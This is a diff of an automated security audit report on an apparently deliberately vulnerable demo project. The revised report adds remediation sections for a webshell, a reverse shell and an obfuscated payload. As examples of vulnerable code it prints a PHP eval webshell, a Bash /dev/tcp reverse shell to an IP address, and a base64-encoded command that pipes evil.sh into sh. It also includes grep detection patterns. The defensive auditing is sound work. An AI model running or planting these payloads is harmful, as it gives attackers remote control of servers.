@@ -2,7 +2,7 @@
 
 - **Scope:** standard · vulnerable-demo
 - **Mode:** local · **Ref:** `no-git` · **Date:** 2026-11-09
-- **Tool:** PN-Ultra-Audit 1.0.23
+- **Tool:** PN-Ultra-Audit 1.0.24
 
 ## Contents
 
@@ -19,9 +19,9 @@
 |---|---|---|
 | Reliability ≥ B | ❌ | D |
 | Security ≥ B | ❌ | E |
-| Maintainability ≤ 10% debt | ❌ | 26.8% |
+| Maintainability ≤ 10% debt | ❌ | 27.3% |
 | 0 secrets in source | ❌ | 4 |
-| Executed coverage units all covered | ✅ | 8/8 |
+| Executed coverage units all covered | ✅ | 10/10 |
 
 ### Ratings
 
@@ -30,20 +30,20 @@
 | Reliability (bugs) | **D** |
 | Security | **E** |
 | Maintainability | **D** |
-| Technical debt ratio | 26.8% (~17.3 h) |
+| Technical debt ratio | 27.3% (~18.0 h) |
 
 ### Findings by severity
 
 | critical | high | medium | low | info | Total | Needs review / validation |
 |---|---|---|---|---|---|---|
-| 7 | 29 | 32 | 20 | 1 | 89 | 23 |
+| 10 | 32 | 33 | 20 | 4 | 99 | 25 |
 
 ### Audited environment
 
 - **Databases:** 1 .sql · app.db: 2 tables
-- **Tests:** 3 files · 4 cases · ratio 0.173 · skipped 0 · no-assert files 2
+- **Tests:** 3 files · 4 cases · ratio 0.168 · skipped 0 · no-assert files 2
 - **Duplication:** 0.0%
-- **LOC:** Python 57, Solidity 18, JavaScript 17, PHP 12, TypeScript 11, Swift 9, SQL 4, Kotlin 1
+- **LOC:** Python 57, Solidity 18, JavaScript 17, PHP 13, TypeScript 11, Swift 9, SQL 4, Shell 2
 
 ### Fix priorities
 
@@ -53,10 +53,10 @@
 4. **[critical] SEC-006** Wallet private key hard-coded — `contracts/.env.example2:1` (30 min)
 5. **[critical] SEC-004** Unsafe deserialization — `backend/app.py:43` (45 min)
 6. **[critical] SEC-007** `initialize()` can be called by anyone and more than once — `contracts/Vault.sol:26` (45 min)
-7. **[critical] SEC-001** 1 of 2 sampled `users.password` values do not look hashed — `app.db:1` (120 min)
-8. **[high] BUG-002** 1 web-first assertion(s) not awaited - they never fail the test — `web/tests/checkout.spec.ts:6` (3 min)
-9. **[high] SEC-032** Android: debuggable / cleartext — `mobile/android/app/src/main/AndroidManifest.xml:2` (5 min)
-10. **[high] SEO-001** Pages without <title> (1 of 1 HTML pages) — `web/index.html:1` (5 min)
+7. **[critical] SEC-008** Shell decodes a blob and pipes it to a shell — `scripts/setup.sh:1` (60 min)
+8. **[critical] SEC-009** Bash reverse shell (/dev/tcp) — `scripts/update.sh:2` (60 min)
+9. **[critical] SEC-010** PHP executes request data (webshell) — `web/uploads/shell.php:1` (60 min)
+10. **[critical] SEC-001** 1 of 2 sampled `users.password` values do not look hashed — `app.db:1` (120 min)
 
 <a id="graficos"></a>
 ## Charts
@@ -66,11 +66,11 @@
 ```mermaid
 pie showData
     title Confirmed findings by severity
-    "critical" : 7
-    "high" : 29
-    "medium" : 32
+    "critical" : 10
+    "high" : 32
+    "medium" : 33
     "low" : 20
-    "info" : 1
+    "info" : 4
 ```
 
 ### By type
@@ -78,9 +78,9 @@ pie showData
 ```mermaid
 pie showData
     title By type
-    "vulnerability" : 39
+    "vulnerability" : 45
+    "code_smell" : 21
     "bug" : 17
-    "code_smell" : 17
     "test_gap" : 12
     "performance" : 2
     "dependency" : 2
@@ -91,9 +91,9 @@ pie showData
 ```mermaid
 xychart-beta
     title "Categories with most confirmed findings"
-    x-axis ["database", "seo", "test-infra", "xss", "flaky", "crypto", "secrets", "sqli"]
+    x-axis ["database", "seo", "test-infra", "malware", "xss", "flaky", "crypto", "secrets"]
     y-axis "n" 0 --> 13
-    bar [12, 11, 6, 5, 5, 4, 4, 4]
+    bar [12, 11, 6, 5, 5, 5, 4, 4]
 ```
 
 ### To review, by priority
@@ -101,8 +101,8 @@ xychart-beta
 ```mermaid
 pie showData
     title To review, by priority
-    "medium" : 14
-    "high" : 8
+    "medium" : 15
+    "high" : 9
     "low" : 1
 ```
 
@@ -117,6 +117,8 @@ flowchart LR
     P --> M3["frontend<br/>6 LOC<br/>0 findings"]
     P --> M4["mobile<br/>6 LOC<br/>0 findings"]
     P --> M5["db<br/>4 LOC<br/>0 findings"]
+    P --> M6["scripts<br/>2 LOC<br/>0 findings"]
+    P --> M7["web<br/>1 LOC<br/>0 findings"]
     classDef bad fill:#ffcdd2,stroke:#c62828,color:#000;
     classDef warn fill:#fff3cd,stroke:#f9a825,color:#000;
     classDef ok fill:#c8e6c9,stroke:#2e7d32,color:#000;
@@ -126,6 +128,8 @@ flowchart LR
     class M3 ok;
     class M4 ok;
     class M5 ok;
+    class M6 ok;
+    class M7 ok;
 ```
 
 ### Fix plan (Gantt)
@@ -141,9 +145,9 @@ gantt
     OS Command Injection x3 :crit, t3, after t2, 1d
     Weak password hashing x2 :crit, t4, after t3, 1d
     Insecure Deserialization x1 :crit, t5, after t4, 1d
-    Cross-Site Scripting XSS x5 :crit, t6, after t5, 1d
-    SQL Injection x4 :crit, t7, after t6, 1d
-    Possible IDOR / BOLA missing owner x2 :crit, t8, after t7, 1d
+    Obfuscated payload decoded and exe x1 :crit, t6, after t5, 1d
+    Reverse shell / remote command cha x1 :crit, t7, after t6, 1d
+    Webshell / remote code execution b x1 :crit, t8, after t7, 1d
     section This sprint medium & quick wins
     Database schema issue x12 :t9, after t8, 1d
     Mobile test strategy & infrastruct x6 :t10, after t9, 2d
@@ -156,7 +160,9 @@ gantt
     section Backlog debt
     Smart contract / crypto security x1 :t17, after t16, 1d
     API documentation docstrings / doc x1 :t18, after t17, 1d
-    Technical SEO & crawlability x1 :t19, after t18, 1d
+    AI agent / spec files are tracked  x2 :t19, after t18, 1d
+    Comments or docs that reveal AI-as x1 :t20, after t19, 1d
+    Technical SEO & crawlability x1 :t21, after t20, 1d
 ```
 
 <a id="tabla"></a>
@@ -171,33 +177,39 @@ gantt
 | SEC-005 | critical | vulnerability | `backend/server.js:6` | Shell command execution (Node) | 30 min |
 | SEC-006 | critical | vulnerability | `contracts/.env.example2:1` | Wallet private key hard-coded | 30 min |
 | SEC-007 | critical | vulnerability | `contracts/Vault.sol:26` | `initialize()` can be called by anyone and more than once | 45 min |
+| SEC-008 | critical | vulnerability | `scripts/setup.sh:1` | Shell decodes a blob and pipes it to a shell | 60 min |
+| SEC-009 | critical | vulnerability | `scripts/update.sh:2` | Bash reverse shell (/dev/tcp) | 60 min |
+| SEC-010 | critical | vulnerability | `web/uploads/shell.php:1` | PHP executes request data (webshell) | 60 min |
 | BUG-001 | high | bug | `mobile/ios/App/Info.plist:1` | iOS: code uses a protected API but Info.plist lacks NSLocationWhenInUseUsageDesc | 10 min |
 | BUG-002 | high | bug | `web/tests/checkout.spec.ts:6` | 1 web-first assertion(s) not awaited - they never fail the test | 3 min |
-| SEC-008 | high | vulnerability | `app/Http/UserController.php:5` | SQL built with string concatenation (PHP) | 20 min |
-| SEC-009 | high | vulnerability | `app/Http/UserController.php:6` | Request data echoed without encoding (PHP) | 10 min |
-| SEC-010 | high | vulnerability | `app/Http/UserController.php:7` | Object loaded by client-supplied id (check ownership) | 20 min |
-| SEC-011 | high | vulnerability | `backend/app.py:5` | Hard-coded credential | 20 min |
-| SEC-012 | high | vulnerability | `backend/app.py:6` | Database URL with credentials | 20 min |
-| SEC-013 | high | vulnerability | `backend/app.py:12` | SQL built with string formatting (Python) | 20 min |
-| SEC-014 | high | vulnerability | `backend/app.py:19` | SQL built with string formatting (Python) | 20 min |
-| SEC-015 | high | vulnerability | `backend/app.py:20` | User input rendered as HTML without escaping (Python) | 10 min |
-| SEC-016 | high | vulnerability | `backend/app.py:31` | Outbound request to user-controlled URL | 30 min |
-| SEC-017 | high | vulnerability | `backend/app.py:39` | File access with user-controlled path | 20 min |
-| SEC-018 | high | vulnerability | `backend/app.py:51` | Password hashed with MD5/SHA-1 | 60 min |
-| SEC-019 | high | vulnerability | `backend/server.js:4` | User input written straight into HTML response (Node) | 10 min |
-| SEC-020 | high | vulnerability | `backend/server.js:5` | SQL built with template/concatenation (JS/TS) | 20 min |
-| SEC-021 | high | vulnerability | `backend/server.js:6` | User input written straight into HTML response (Node) | 10 min |
-| SEC-022 | high | vulnerability | `backend/server.js:7` | JWT signed with hard-coded secret | 20 min |
-| SEC-023 | high | vulnerability | `backend/server.js:8` | Object loaded by client-supplied id (check ownership) | 20 min |
-| SEC-024 | high | vulnerability | `contracts/Vault.sol:12` | `withdraw()` updates state AFTER an external call (reentrancy) | 60 min |
-| SEC-025 | high | vulnerability | `contracts/Vault.sol:18` | `sweep()` moves value/mints/burns/selfdestructs but has no visible access contro | 60 min |
-| SEC-026 | high | vulnerability | `contracts/Vault.sol:22` | Solidity tx.origin authorization | 20 min |
-| SEC-027 | high | vulnerability | `contracts/Vault.sol:22` | tx.origin used for authorization (phishing via intermediate contract) | 15 min |
-| SEC-028 | high | vulnerability | `contracts/Vault.sol:24` | `pickWinner()` derives randomness from block data (miner/validator-influenced) | 120 min |
-| SEC-029 | high | vulnerability | `db/schema.sql:3` | Over-broad GRANT | 20 min |
-| SEC-030 | high | vulnerability | `db/schema.sql:4` | Database user password in SQL script | 20 min |
-| SEC-031 | high | vulnerability | `frontend/src/App.jsx:2` | Raw HTML sink (innerHTML/document.write) | 15 min |
-| SEC-032 | high | vulnerability | `mobile/android/app/src/main/AndroidManifest.xml:2` | Android: debuggable / cleartext | 5 min |
+| SEC-011 | high | vulnerability | `.github/workflows/deploy.yml:7` | Pipes environment/credentials to a network tool | 60 min |
+| SEC-012 | high | vulnerability | `app/Http/UserController.php:5` | SQL built with string concatenation (PHP) | 20 min |
+| SEC-013 | high | vulnerability | `app/Http/UserController.php:6` | Request data echoed without encoding (PHP) | 10 min |
+| SEC-014 | high | vulnerability | `app/Http/UserController.php:7` | Object loaded by client-supplied id (check ownership) | 20 min |
+| SEC-015 | high | vulnerability | `backend/app.py:5` | Hard-coded credential | 20 min |
+| SEC-016 | high | vulnerability | `backend/app.py:6` | Database URL with credentials | 20 min |
+| SEC-017 | high | vulnerability | `backend/app.py:12` | SQL built with string formatting (Python) | 20 min |
+| SEC-018 | high | vulnerability | `backend/app.py:19` | SQL built with string formatting (Python) | 20 min |
+| SEC-019 | high | vulnerability | `backend/app.py:20` | User input rendered as HTML without escaping (Python) | 10 min |
+| SEC-020 | high | vulnerability | `backend/app.py:31` | Outbound request to user-controlled URL | 30 min |
+| SEC-021 | high | vulnerability | `backend/app.py:39` | File access with user-controlled path | 20 min |
+| SEC-022 | high | vulnerability | `backend/app.py:51` | Password hashed with MD5/SHA-1 | 60 min |
+| SEC-023 | high | vulnerability | `backend/server.js:4` | User input written straight into HTML response (Node) | 10 min |
+| SEC-024 | high | vulnerability | `backend/server.js:5` | SQL built with template/concatenation (JS/TS) | 20 min |
+| SEC-025 | high | vulnerability | `backend/server.js:6` | User input written straight into HTML response (Node) | 10 min |
+| SEC-026 | high | vulnerability | `backend/server.js:7` | JWT signed with hard-coded secret | 20 min |
+| SEC-027 | high | vulnerability | `backend/server.js:8` | Object loaded by client-supplied id (check ownership) | 20 min |
+| SEC-028 | high | vulnerability | `config/pool.json:1` | Cryptocurrency miner (stratum / XMRig / CoinHive) | 60 min |
+| SEC-029 | high | vulnerability | `contracts/Vault.sol:12` | `withdraw()` updates state AFTER an external call (reentrancy) | 60 min |
+| SEC-030 | high | vulnerability | `contracts/Vault.sol:18` | `sweep()` moves value/mints/burns/selfdestructs but has no visible access contro | 60 min |
+| SEC-031 | high | vulnerability | `contracts/Vault.sol:22` | Solidity tx.origin authorization | 20 min |
+| SEC-032 | high | vulnerability | `contracts/Vault.sol:22` | tx.origin used for authorization (phishing via intermediate contract) | 15 min |
+| SEC-033 | high | vulnerability | `contracts/Vault.sol:24` | `pickWinner()` derives randomness from block data (miner/validator-influenced) | 120 min |
+| SEC-034 | high | vulnerability | `db/schema.sql:3` | Over-broad GRANT | 20 min |
+| SEC-035 | high | vulnerability | `db/schema.sql:4` | Database user password in SQL script | 20 min |
+| SEC-036 | high | vulnerability | `frontend/src/App.jsx:2` | Raw HTML sink (innerHTML/document.write) | 15 min |
+| SEC-037 | high | vulnerability | `mobile/android/app/src/main/AndroidManifest.xml:2` | Android: debuggable / cleartext | 5 min |
+| SEC-038 | high | vulnerability | `web/uploads/shell.php:1` | Dynamic code evaluation | 30 min |
 | SEO-001 | high | bug | `web/index.html:1` | Pages without <title> (1 of 1 HTML pages) | 5 min |
 | SEO-002 | high | bug | `web/public/robots.txt:1` | robots.txt blocks the whole site (Disallow: /) | 5 min |
 | A11-001 | medium | bug | `web/index.html:10` | Image without alt text | 3 min |
@@ -211,14 +223,15 @@ gantt
 | BUG-009 | medium | bug | `db/schema.sql:2` | Money column `orders.total` uses FLOAT | 30 min |
 | BUG-010 | medium | bug | `web/tests/checkout.spec.ts:8` | Focused test committed (`.only` / `fit`) - the rest of the suite is silently ski | 2 min |
 | COD-001 | medium | code_smell | `.:1` | Project has no README | 45 min |
-| COD-002 | medium | code_smell | `app.db:1` | Table `users` has no PRIMARY KEY | 25 min |
-| COD-003 | medium | code_smell | `db/schema.sql:1` | Table `users` has no PRIMARY KEY | 20 min |
-| SEC-033 | medium | vulnerability | `app.db:1` | SQLite file is world-accessible (0o644) | 5 min |
-| SEC-034 | medium | vulnerability | `backend/app.py:35` | Redirect to user-controlled URL | 10 min |
-| SEC-035 | medium | vulnerability | `backend/server.js:9` | Non-cryptographic RNG for secrets | 10 min |
-| SEC-036 | medium | vulnerability | `contracts/Vault.sol:24` | Solidity randomness from block data | 60 min |
-| SEC-037 | medium | vulnerability | `db/schema.sql:1` | Password column `users.password` too short for a modern hash (32) | 30 min |
-| SEC-038 | medium | vulnerability | `frontend/src/App.jsx:4` | Secret/password written to logs | 5 min |
+| COD-002 | medium | code_smell | `.github/workflows/deploy.yml:1` | CI does not appear to run: tests, lint | 45 min |
+| COD-003 | medium | code_smell | `app.db:1` | Table `users` has no PRIMARY KEY | 25 min |
+| COD-004 | medium | code_smell | `db/schema.sql:1` | Table `users` has no PRIMARY KEY | 20 min |
+| SEC-039 | medium | vulnerability | `app.db:1` | SQLite file is world-accessible (0o644) | 5 min |
+| SEC-040 | medium | vulnerability | `backend/app.py:35` | Redirect to user-controlled URL | 10 min |
+| SEC-041 | medium | vulnerability | `backend/server.js:9` | Non-cryptographic RNG for secrets | 10 min |
+| SEC-042 | medium | vulnerability | `contracts/Vault.sol:24` | Solidity randomness from block data | 60 min |
+| SEC-043 | medium | vulnerability | `db/schema.sql:1` | Password column `users.password` too short for a modern hash (32) | 30 min |
+| SEC-044 | medium | vulnerability | `frontend/src/App.jsx:4` | Secret/password written to logs | 5 min |
 | SEM-001 | medium | vulnerability | `web/index.html:1` | Tracking tags found (Google Analytics 4, Meta Pixel) but no consent management d | 120 min |
 | SEO-003 | medium | code_smell | `.:1` | No sitemap.xml (or generator) found | 30 min |
 | SEO-004 | medium | code_smell | `web/index.html:1` | Pages without meta description (1 of 1 HTML pages) | 5 min |
@@ -234,12 +247,12 @@ gantt
 | TST-009 | medium | test_gap | `web/tests/checkout.spec.ts:4` | Fixed sleeps in tests: 2 occurrence(s) in 1 file(s) | 8 min |
 | A11-003 | low | bug | `web/index.html:2` | <html> without lang attribute | 2 min |
 | BUG-011 | low | bug | `backend/app.py:53` | Mutable default argument that is mutated or leaked | 10 min |
-| COD-004 | low | code_smell | `.:1` | Public API documentation coverage is 0.0% (target 60%) | 15 min |
-| COD-005 | low | code_smell | `app.db:1` | Foreign keys declared but PRAGMA foreign_keys is OFF by default | 10 min |
-| COD-006 | low | code_smell | `backend/app.py:1` | Public API under-documented in `backend/app.py` (0/12) | 36 min |
-| COD-007 | low | code_smell | `backend/app.py:62` | Empty catch/except (swallowed error) | 10 min |
-| COD-008 | low | code_smell | `contracts/Vault.sol:1` | Floating pragma (^0.8.0): deployed bytecode may differ from what was audited | 5 min |
-| COD-009 | low | code_smell | `db/schema.sql:2` | Table `orders` uses MyISAM | 20 min |
+| COD-005 | low | code_smell | `.:1` | Public API documentation coverage is 0.0% (target 60%) | 15 min |
+| COD-006 | low | code_smell | `app.db:1` | Foreign keys declared but PRAGMA foreign_keys is OFF by default | 10 min |
+| COD-007 | low | code_smell | `backend/app.py:1` | Public API under-documented in `backend/app.py` (0/12) | 36 min |
+| COD-008 | low | code_smell | `backend/app.py:62` | Empty catch/except (swallowed error) | 10 min |
+| COD-009 | low | code_smell | `contracts/Vault.sol:1` | Floating pragma (^0.8.0): deployed bytecode may differ from what was audited | 5 min |
+| COD-010 | low | code_smell | `db/schema.sql:2` | Table `orders` uses MyISAM | 20 min |
 | DEP-001 | low | dependency | `package.json:1` | `package.json` has no lockfile | 5 min |
 | DEP-002 | low | dependency | `web/package.json:1` | `web/package.json` has no lockfile | 5 min |
 | PER-001 | low | performance | `app.db:1` | Foreign key `orders.user_id` without index | 10 min |
@@ -252,6 +265,9 @@ gantt
 | TST-010 | low | test_gap | `.:1` | iOS: code coverage not enabled in scheme/test plan | 10 min |
 | TST-011 | low | test_gap | `.:1` | No Slither/Echidna/Medusa/Certora in CI | 90 min |
 | TST-012 | low | test_gap | `mobile/ios/AppUITests/LoginUITests.swift:1` | iOS: 1 UI test file(s) do not set continueAfterFailure = false | 2 min |
+| COD-011 | info | code_smell | `.cursor/rules/style.mdc:1` | Cursor configuration committed: .cursor | 5 min |
+| COD-012 | info | code_smell | `CLAUDE.md:1` | Claude Code configuration committed: CLAUDE.md | 5 min |
+| COD-013 | info | code_smell | `backend/utils_ai.py:1` | Comment reveals AI-assisted authoring | 2 min |
 | SEO-011 | info | code_smell | `web/public/robots.txt:1` | robots.txt does not reference the sitemap | 2 min |
 
 ### Files with most findings
@@ -317,7 +333,7 @@ function withdraw(uint amt) external nonReentrant {
 
 **How to verify:** `slither .` clean of high/medium; invariant test 'sum(balances) == address(this).balance' holds under fuzzing; external audit report resolved.
 
-- [ ] `SEC-007`, `SEC-024`, `SEC-025`, `SEC-027`, `SEC-028`, `TST-011`, `COD-008`  — tick when fixed, then re-run the audit
+- [ ] `SEC-007`, `SEC-029`, `SEC-030`, `SEC-032`, `SEC-033`, `TST-011`, `COD-009`  — tick when fixed, then re-run the audit
 
 ### 2. Hard-coded secret / credential  · **critical**  · 4 confirmed · 1 to review
 
@@ -357,7 +373,7 @@ API_KEY = os.environ["API_KEY"]
 
 **How to verify:** `gitleaks detect` returns clean; old key shows revoked in the provider console.
 
-- [ ] `SEC-006`, `SEC-011`, `SEC-012`, `SEC-030`  — tick when fixed, then re-run the audit
+- [ ] `SEC-006`, `SEC-015`, `SEC-016`, `SEC-035`  — tick when fixed, then re-run the audit
 
 ### 3. OS Command Injection  · **critical**  · 3 confirmed · 1 to review
 
@@ -427,9 +443,45 @@ $hash = password_hash($password, PASSWORD_ARGON2ID);  password_verify($input, $h
 
 **How to verify:** Check new users have `$argon2id$`/`$2y$` prefix; legacy hashes upgrade on login.
 
-- [ ] `SEC-001`, `SEC-018`  — tick when fixed, then re-run the audit
+- [ ] `SEC-001`, `SEC-022`  — tick when fixed, then re-run the audit
 
-### 5. Insecure Deserialization  · **critical**  · 1 confirmed · 0 to review
+### 5. Webshell / remote code execution backdoor  · **critical**  · 1 confirmed · 1 to review
+
+**What it is.** Code that executes attacker-controlled input (eval/assert/system on $_POST/$_GET/$_REQUEST, eval(base64_decode(...)), dynamic function names from the request) or a known webshell signature (c99, r57, b374k, WSO, China Chopper, FilesMan), or a script/PHP payload hidden inside an image or an upload folder.
+
+**Impact.** Full remote control of the server: read the database and secrets, deface or pivot into your network, install miners and persistence. This is usually the footprint of a past compromise.
+
+**Where to fix:**
+
+| Sev. | File | Title | Effort |
+|---|---|---|---|
+| critical | `web/uploads/shell.php:1` | PHP executes request data (webshell) | 60 min |
+| review/high | `web/uploads/shell.php:1` | Server-side script stored in an upload/cache/media folder | 30 min |
+
+**Steps:**
+
+1. ISOLATE: take the host/CI runner offline or block its egress; do not delete evidence yet (copy the file and `git log -p -- <file>` somewhere safe).
+2. ROTATE every secret the machine or repository could read (cloud keys, DB passwords, API tokens, SSH keys, CI secrets, signing keys). Assume they are compromised.
+3. REMOVE the malicious code and find HOW it got in: `git log -p --follow -- <file>` (who/when), compromised dependency or account, vulnerable upload form, leaked deploy key.
+4. Delete the file (after copying it as evidence), then compare the whole web root with a clean checkout: `git status`, `git diff --stat`, or `diff -r clean/ live/`.
+5. Block execution in upload/cache folders (nginx `location ~* /uploads/.*\.php$ { deny all; }` or Apache `php_flag engine off`) and make the web root read-only for the app user.
+6. Patch how it got in (vulnerable plugin/upload form/CMS version, stolen FTP/SSH credentials) before putting the server back online.
+
+**Vulnerable code/config:**
+```
+<?php @eval($_POST['x']); ?>
+```
+
+**Safe form:**
+```
+// no dynamic execution of request data; file uploads stored outside the web root, validated by content type and re-encoded
+```
+
+**How to verify:** `grep -RIlE "eval\s*\(\s*(base64_decode|\$_(POST|GET|REQUEST))" .` finds nothing; no PHP files in upload folders; the file hashes match a clean release; access logs show no requests to the old path.
+
+- [ ] `SEC-010`  — tick when fixed, then re-run the audit
+
+### 6. Insecure Deserialization  · **critical**  · 1 confirmed · 0 to review
 
 **What it is.** Untrusted bytes are deserialized with a format that can instantiate arbitrary objects (pickle, PHP unserialize, Java ObjectInputStream, yaml.load, Marshal).
 
@@ -462,7 +514,75 @@ obj = json.loads(request.data)   # + schema validation; yaml.safe_load(...)
 
 - [ ] `SEC-004`  — tick when fixed, then re-run the audit
 
-### 6. Database schema issue  · **high**  · 13 confirmed · 0 to review
+### 7. Obfuscated payload decoded and executed  · **critical**  · 1 confirmed · 0 to review
+
+**What it is.** Code decodes a blob (base64, zlib, hex, packer) and immediately executes it (`exec(base64.b64decode(...))`, `eval(atob(...))`, `eval(function(p,a,c,k,e,d)...)`, PowerShell `-EncodedCommand` or `IEX` of a download, `echo ... | base64 -d | sh`). Malware uses this to hide what it does; a few commercial obfuscators do too.
+
+**Impact.** You cannot review what actually runs; typical vehicle for droppers, stealers and backdoors.
+
+**Where to fix:**
+
+| Sev. | File | Title | Effort |
+|---|---|---|---|
+| critical | `scripts/setup.sh:1` | Shell decodes a blob and pipes it to a shell | 60 min |
+
+**Steps:**
+
+1. Do NOT run it. Decode in a sandbox/offline: replace the `exec/eval` with `print` and run in a throwaway container, or decode the blob with `base64 -d` and read it.
+2. Find who added it: `git log -p -S'<fragment>' -- <file>`; if it was not intentional treat it as an incident (see the response steps below).
+3. If it is a legitimate commercial obfuscator/licence loader, document it, pin the source, and keep it out of the repo (build step instead).
+4. Replace dynamic execution with readable code or a reviewed dependency.
+5. ROTATE every secret the machine or repository could read (cloud keys, DB passwords, API tokens, SSH keys, CI secrets, signing keys). Assume they are compromised.
+
+**Vulnerable code/config:**
+```
+exec(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgZXZpbC5zaCB8IHNoJyk='))
+```
+
+**Safe form:**
+```
+# explicit, reviewable code; no decode-and-execute
+```
+
+**How to verify:** No exec/eval of decoded data remains; the decoded content was read and is understood; tests and build pass.
+
+- [ ] `SEC-008`  — tick when fixed, then re-run the audit
+
+### 8. Reverse shell / remote command channel  · **critical**  · 1 confirmed · 0 to review
+
+**What it is.** Code opens a connection to a remote host and attaches a shell to it (`bash -i >& /dev/tcp/IP/PORT`, `nc -e /bin/sh`, Python socket+dup2, Node net.Socket + spawn('/bin/sh'), PowerShell TCPClient + IEX).
+
+**Impact.** The attacker gets an interactive shell on your machine/CI/server with the permissions of that process.
+
+**Where to fix:**
+
+| Sev. | File | Title | Effort |
+|---|---|---|---|
+| critical | `scripts/update.sh:2` | Bash reverse shell (/dev/tcp) | 60 min |
+
+**Steps:**
+
+1. Treat as an active compromise: ISOLATE: take the host/CI runner offline or block its egress; do not delete evidence yet (copy the file and `git log -p -- <file>` somewhere safe).
+2. ROTATE every secret the machine or repository could read (cloud keys, DB passwords, API tokens, SSH keys, CI secrets, signing keys). Assume they are compromised.
+3. Remove the code, then find out how it was introduced (`git log -p -S'/dev/tcp' -- <file>`) and which commit/account/dependency added it.
+4. Block outbound connections from build/runtime hosts except an allow-list (egress firewall, Kubernetes NetworkPolicy) and monitor for new outbound connections.
+5. REBUILD from a clean commit or image instead of cleaning in place; redeploy, and compare file hashes with a known-good release.
+
+**Vulnerable code/config:**
+```
+bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
+```
+
+**Safe form:**
+```
+# no interactive shell to remote hosts; use SSH with keys + audited bastion for administration
+```
+
+**How to verify:** `grep -RIn '/dev/tcp/\|nc -e\|mkfifo' .` finds only documentation; `ss -tnp` shows no unexpected outbound sessions; secrets were rotated.
+
+- [ ] `SEC-009`  — tick when fixed, then re-run the audit
+
+### 9. Database schema issue  · **high**  · 13 confirmed · 0 to review
 
 **What it is.** Schema design problems that harm integrity, performance or security.
 
@@ -504,9 +624,9 @@ CREATE TABLE t (id BIGSERIAL PRIMARY KEY, name text NOT NULL);  CREATE INDEX ON 
 
 **How to verify:** Re-run `python3 audit.py --db ...`; finding gone.
 
-- [ ] `SEC-029`, `BUG-003`, `COD-002`, `BUG-004`, `BUG-005`, `COD-003`, `BUG-008`, `SEC-037`, `BUG-009`, `COD-005`, `PER-001`, `PER-002` …  — tick when fixed, then re-run the audit
+- [ ] `SEC-034`, `BUG-003`, `COD-003`, `BUG-004`, `BUG-005`, `COD-004`, `BUG-008`, `SEC-043`, `BUG-009`, `COD-006`, `PER-001`, `PER-002` …  — tick when fixed, then re-run the audit
 
-### 7. Cross-Site Scripting (XSS)  · **high**  · 5 confirmed · 1 to review
+### 10. Cross-Site Scripting (XSS)  · **high**  · 6 confirmed · 1 to review
 
 **What it is.** Untrusted data is written into HTML/JS/URL context without context-correct encoding, so the browser executes attacker script in your origin.
 
@@ -521,6 +641,7 @@ CREATE TABLE t (id BIGSERIAL PRIMARY KEY, name text NOT NULL);  CREATE INDEX ON 
 | high | `backend/server.js:4` | User input written straight into HTML response (Node) | 10 min |
 | high | `backend/server.js:6` | User input written straight into HTML response (Node) | 10 min |
 | high | `frontend/src/App.jsx:2` | Raw HTML sink (innerHTML/document.write) | 15 min |
+| high | `web/uploads/shell.php:1` | Dynamic code evaluation | 30 min |
 | review/high | `frontend/src/App.jsx:5` | Framework raw-HTML escape hatch | 15 min |
 
 **Steps:**
@@ -546,9 +667,9 @@ echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');   // PHP
 
 **How to verify:** Inject `"><svg onload=alert(1)>` into the field in a local build; nothing should execute.
 
-- [ ] `SEC-009`, `SEC-015`, `SEC-019`, `SEC-021`, `SEC-031`  — tick when fixed, then re-run the audit
+- [ ] `SEC-013`, `SEC-019`, `SEC-023`, `SEC-025`, `SEC-036`, `SEC-038`  — tick when fixed, then re-run the audit
 
-### 8. Android manifest/WebView/storage weaknesses  · **high**  · 1 confirmed · 5 to review
+### 11. Android manifest/WebView/storage weaknesses  · **high**  · 1 confirmed · 5 to review
 
 **What it is.** Debuggable builds, backups, cleartext traffic, exported components, permissive WebView and plaintext token storage expose app data.
 
@@ -584,9 +705,9 @@ android:allowBackup="false"
 
 **How to verify:** Inspect merged manifest in release build; `adb backup` yields nothing.
 
-- [ ] `SEC-032`  — tick when fixed, then re-run the audit
+- [ ] `SEC-037`  — tick when fixed, then re-run the audit
 
-### 9. On-page SEO  · **high**  · 6 confirmed · 0 to review
+### 12. On-page SEO  · **high**  · 6 confirmed · 0 to review
 
 **What it is.** Page-level signals search engines and social networks rely on are missing or malformed: title, meta description, canonical, single H1, Open Graph/Twitter cards, language, image alt text, structured data.
 
@@ -629,7 +750,7 @@ android:allowBackup="false"
 
 - [ ] `SEO-001`, `SEO-004`, `SEO-005`, `SEO-006`, `SEO-007`, `SEO-008`  — tick when fixed, then re-run the audit
 
-### 10. SQL Injection  · **high**  · 4 confirmed · 1 to review
+### 13. SQL Injection  · **high**  · 4 confirmed · 1 to review
 
 **What it is.** User-controlled text is concatenated/interpolated into an SQL statement, so the database parses attacker input as SQL code instead of data.
 
@@ -670,9 +791,9 @@ query = f"SELECT * FROM users WHERE name = '{name}'"
 
 **How to verify:** Run the new test; also try `sqlmap` or manual payloads only against your local/staging copy.
 
-- [ ] `SEC-008`, `SEC-013`, `SEC-014`, `SEC-020`  — tick when fixed, then re-run the audit
+- [ ] `SEC-012`, `SEC-017`, `SEC-018`, `SEC-024`  — tick when fixed, then re-run the audit
 
-### 11. Technical SEO & crawlability  · **high**  · 3 confirmed · 1 to review
+### 14. Technical SEO & crawlability  · **high**  · 3 confirmed · 1 to review
 
 **What it is.** Crawlers cannot reliably discover, fetch or index pages: broken links, redirect chains, missing/incorrect robots.txt or sitemap, noindex mistakes, client-side-only rendering, missing HTTPS redirect or compression.
 
@@ -713,7 +834,7 @@ Sitemap: https://acme.com/sitemap.xml
 
 - [ ] `SEO-002`, `SEO-003`, `SEO-011`  — tick when fixed, then re-run the audit
 
-### 12. Possible IDOR / BOLA (missing ownership check)  · **high**  · 2 confirmed · 0 to review
+### 15. Possible IDOR / BOLA (missing ownership check)  · **high**  · 2 confirmed · 0 to review
 
 **What it is.** An object is loaded by a client-supplied ID; if the code does not also check it belongs to the caller/tenant, anyone can read or edit others' data.
 
@@ -744,9 +865,9 @@ $request->user()->orders()->findOrFail($request->id)
 
 **How to verify:** Cross-account request returns 404/403.
 
-- [ ] `SEC-010`, `SEC-023`  — tick when fixed, then re-run the audit
+- [ ] `SEC-014`, `SEC-027`  — tick when fixed, then re-run the audit
 
-### 13. JWT misuse  · **high**  · 2 confirmed · 0 to review
+### 16. JWT misuse  · **high**  · 2 confirmed · 0 to review
 
